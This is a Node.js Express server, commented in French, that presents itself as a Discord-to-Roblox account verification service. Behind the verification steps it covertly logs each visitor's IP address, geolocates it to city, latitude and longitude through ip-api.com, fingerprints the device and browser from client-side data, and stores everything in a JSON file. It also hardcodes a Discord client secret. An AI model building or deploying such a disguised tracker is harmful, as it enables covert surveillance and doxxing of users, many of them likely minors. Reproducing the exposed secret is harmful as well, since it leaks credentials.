const express = require("express");
const fs = require("fs");
const path = require("path");
const cors = require("cors");
const session = require("express-session");
const crypto = require("crypto");

const fetch = (...args) =>
  import("node-fetch").then(({ default: f }) => f(...args));

const app = express();
const PORT = process.env.PORT || 3000;

// ─── ⚙️ CONFIG — MODIFIE CES VALEURS ─────────────────────
const DISCORD_CLIENT_ID     = "1501658276171874352";
const DISCORD_CLIENT_SECRET = "4MblsbmchZXnd8-0M-m-Bd6cMpPONHqS";
const REDIRECT_URI = "https://ronblox-id-production.up.railway.app/callback/discord";
const SESSION_SECRET        = "change_ce_secret_tres_long";
// ──────────────────────────────────────────────────────────

const USERS_FILE = path.join(__dirname, "users.json");

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));
app.set("trust proxy", true);
app.use(
  session({
    secret: SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: { secure: false, maxAge: 1000 * 60 * 60 },
  })
);

// ─── UTILITAIRES JSON ─────────────────────────────────────
function readUsers() {
  if (!fs.existsSync(USERS_FILE)) {
    fs.writeFileSync(USERS_FILE, JSON.stringify([], null, 2));
  }
  return JSON.parse(fs.readFileSync(USERS_FILE, "utf-8"));
}

function saveUser(newUser) {
  const users = readUsers();
  const index = users.findIndex((u) => u.discordId === newUser.discordId);
  if (index !== -1) {
    users[index] = { ...users[index], ...newUser, updatedAt: new Date().toISOString() };
  } else {
    users.push({ ...newUser, createdAt: new Date().toISOString() });
  }
  fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
}

// ─── IP ───────────────────────────────────────────────────
function getIP(req) {
  return (
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
    req.headers["x-real-ip"] ||
    req.socket.remoteAddress ||
    "inconnue"
  );
}

// ─── USER-AGENT ───────────────────────────────────────────
function parseUserAgent(ua) {
  if (!ua) return { browser: "Inconnu", os: "Inconnu", appareil: "Inconnu" };

  let browser = "Inconnu";
  let os = "Inconnu";
  let appareil = "Ordinateur";

  if (ua.includes("Edg/"))         browser = "Microsoft Edge";
  else if (ua.includes("OPR/"))    browser = "Opera";
  else if (ua.includes("Chrome"))  browser = "Chrome";
  else if (ua.includes("Firefox")) browser = "Firefox";
  else if (ua.includes("Safari"))  browser = "Safari";

  if (ua.includes("Windows NT 10.0"))     os = "Windows 10/11";
  else if (ua.includes("Windows NT 6.3")) os = "Windows 8.1";
  else if (ua.includes("Windows NT 6.1")) os = "Windows 7";
  else if (ua.includes("Windows"))        os = "Windows";
  else if (ua.includes("Mac OS X"))       os = "macOS";
  else if (ua.includes("Android"))        os = "Android";
  else if (ua.includes("iPhone"))         os = "iOS (iPhone)";
  else if (ua.includes("iPad"))           os = "iOS (iPad)";
  else if (ua.includes("Linux"))          os = "Linux";

  if (ua.includes("Mobile") || ua.includes("iPhone") || ua.includes("Android")) appareil = "Mobile";
  else if (ua.includes("iPad") || ua.includes("Tablet")) appareil = "Tablette";

  return { browser, os, appareil };
}

// ─── GÉOLOCALISATION ─────────────────────────────────────
async function geolocateIP(ip) {
  try {
    if (ip === "::1" || ip === "127.0.0.1" || ip.startsWith("192.168") || ip.startsWith("10.")) {
      return { pays: "Local", code_pays: "LOCAL", region: "Local", ville: "Local", isp: "Local", timezone: "Local", latitude: null, longitude: null };
    }
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,isp,org,timezone,lat,lon`);
    const data = await res.json();
    if (data.status === "success") {
      return {
        pays: data.country,
        code_pays: data.countryCode,
        region: data.regionName,
        ville: data.city,
        isp: data.isp,
        organisation: data.org,
        timezone: data.timezone,
        latitude: data.lat,
        longitude: data.lon,
      };
    }
    return { pays: "Inconnu" };
  } catch {
    return { pays: "Erreur" };
  }
}

// ─── CODE ALÉATOIRE ──────────────────────────────────────
const CHARS = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";

function generateRandomCode() {
  let part1 = "";
  let part2 = "";
  for (let i = 0; i < 5; i++) part1 += CHARS[crypto.randomInt(0, CHARS.length)];
  for (let i = 0; i < 5; i++) part2 += CHARS[crypto.randomInt(0, CHARS.length)];
  return `VRF-${part1}-${part2}`;
}

// ─── VÉRIFICATION ROBLOX ─────────────────────────────────
async function verifyRoblox(robloxUsername, expectedCode) {
  const searchRes = await fetch("https://users.roblox.com/v1/usernames/users", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ usernames: [robloxUsername], excludeBannedUsers: true }),
  });
  const searchData = await searchRes.json();
  const robloxUser = searchData.data?.[0];
  if (!robloxUser) throw new Error("Utilisateur Roblox introuvable.");

  const profileRes = await fetch(`https://users.roblox.com/v1/users/${robloxUser.id}`);
  const profile = await profileRes.json();

  if (!profile.description || !profile.description.includes(expectedCode)) {
    throw new Error(`Code non trouvé dans la bio. Mets "${expectedCode}" dans ta description Roblox.`);
  }

  return { robloxId: String(robloxUser.id), robloxUsername: profile.name };
}

// ─── ROUTES ───────────────────────────────────────────────
app.get("/auth/discord", (req, res) => {
  req.session.ipAddress = getIP(req);
  req.session.userAgent = req.headers["user-agent"] || "";
  req.session.langue = req.headers["accept-language"]?.split(",")[0] || "Inconnue";
  req.session.referer = req.headers["referer"] || "Direct";
  const url = `https://discord.com/api/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify`;
  res.redirect(url);
});

app.get("/callback/discord", async (req, res) => {
  const { code } = req.query;
  if (!code) return res.redirect("/?error=no_code");

  try {
    const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
      method: "POST",
      body: new URLSearchParams({
        client_id: DISCORD_CLIENT_ID,
        client_secret: DISCORD_CLIENT_SECRET,
        grant_type: "authorization_code",
        code,
        redirect_uri: REDIRECT_URI,
      }),
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
    });
    const tokenData = await tokenRes.json();
    if (!tokenData.access_token) throw new Error("Token invalide");

    const userRes = await fetch("https://discord.com/api/users/@me", {
      headers: { Authorization: `Bearer ${tokenData.access_token}` },
    });
    const discordUser = await userRes.json();

    req.session.discord = {
      id: discordUser.id,
      username: discordUser.username,
      globalName: discordUser.global_name || discordUser.username,
      avatar: discordUser.avatar,
      tag: discordUser.discriminator && discordUser.discriminator !== "0"
        ? `${discordUser.username}#${discordUser.discriminator}`
        : discordUser.username,
    };

    res.redirect("/");
  } catch (err) {
    console.error("Erreur Discord OAuth:", err.message);
    res.redirect("/?error=oauth_failed");
  }
});

app.get("/api/me", (req, res) => {
  if (!req.session.discord) return res.json({ loggedIn: false });
  const users = readUsers();
  const linked = users.find((u) => u.discordId === req.session.discord.id);
  res.json({ loggedIn: true, discord: req.session.discord, verifyCode: req.session.verifyCode || null, linked: linked || null });
});

app.post("/api/get-code", (req, res) => {
  if (!req.session.discord)
    return res.status(401).json({ success: false, message: "Non connecté à Discord." });

  const { robloxUsername } = req.body;
  if (!robloxUsername?.trim())
    return res.status(400).json({ success: false, message: "Pseudo Roblox requis." });

  const code = generateRandomCode();
  req.session.pendingRoblox = robloxUsername.trim();
  req.session.verifyCode = code;

  res.json({ success: true, code });
});

// Route pour recevoir les infos supplémentaires envoyées par le frontend (JS côté client)
app.post("/api/client-info", (req, res) => {
  if (!req.session.discord)
    return res.status(401).json({ success: false });

  req.session.clientInfo = req.body;
  res.json({ success: true });
});

app.post("/api/verify", async (req, res) => {
  if (!req.session.discord)
    return res.status(401).json({ success: false, message: "Non connecté à Discord." });

  const robloxUsername = req.session.pendingRoblox;
  const code = req.session.verifyCode;

  if (!robloxUsername || !code)
    return res.status(400).json({ success: false, message: "Lance d'abord l'étape 1." });

  try {
    const { robloxId, robloxUsername: confirmedName } = await verifyRoblox(robloxUsername, code);

    const ip = req.session.ipAddress || getIP(req);
    const ua = req.session.userAgent || req.headers["user-agent"] || "";
    const { browser, os, appareil } = parseUserAgent(ua);
    const geo = await geolocateIP(ip);
    const client = req.session.clientInfo || {};

    const userData = {
      // ── Discord ──
      discordId: req.session.discord.id,
      discordTag: req.session.discord.tag,
      discordUsername: req.session.discord.username,
      discordGlobalName: req.session.discord.globalName,

      // ── Roblox ──
      robloxId,
      robloxUsername: confirmedName,

      // ── Réseau ──
      reseau: {
        ipAddress: ip,
        isp: geo.isp || "Inconnu",
        organisation: geo.organisation || "Inconnue",
      },

      // ── Localisation ──
      localisation: {
        pays: geo.pays,
        code_pays: geo.code_pays,
        region: geo.region,
        ville: geo.ville,
        timezone: geo.timezone,
        latitude: geo.latitude,
        longitude: geo.longitude,
      },

      // ── Appareil ──
      appareil: {
        type: appareil,
        os,
        navigateur: browser,
        langue: req.session.langue || "Inconnue",
        userAgent: ua,
      },

      // ── Infos navigateur (envoyées par le JS client) ──
      navigateur: {
        resolution: client.resolution || "Inconnue",
        plateforme: client.platform || "Inconnue",
        nbCoeurs: client.cores || "Inconnu",
        memoire: client.memory ? `${client.memory} Go` : "Inconnue",
        touchscreen: client.touch ?? "Inconnu",
        cookiesActives: client.cookies ?? "Inconnu",
        fuseauHoraire: client.timezone || "Inconnu",
        langues: client.languages || "Inconnues",
        connexion: client.connection || "Inconnue",
      },
    };

    saveUser(userData);
    delete req.session.pendingRoblox;
    delete req.session.verifyCode;
    delete req.session.clientInfo;

    console.log(`✅ ${userData.discordTag} ↔ ${confirmedName} | ${ip} | ${geo.ville}, ${geo.pays} | ${browser} / ${os}`);
    res.json({ success: true, message: "Compte lié avec succès !", data: userData });
  } catch (err) {
    res.status(400).json({ success: false, message: err.message });
  }
});

app.get("/logout", (req, res) => {
  req.session.destroy();
  res.redirect("/");
});

app.listen(PORT, () => {
  console.log(`🚀 Serveur sur http://localhost:${PORT}`);
  console.log(`📁 Fichier de données : ${USERS_FILE}`);
});
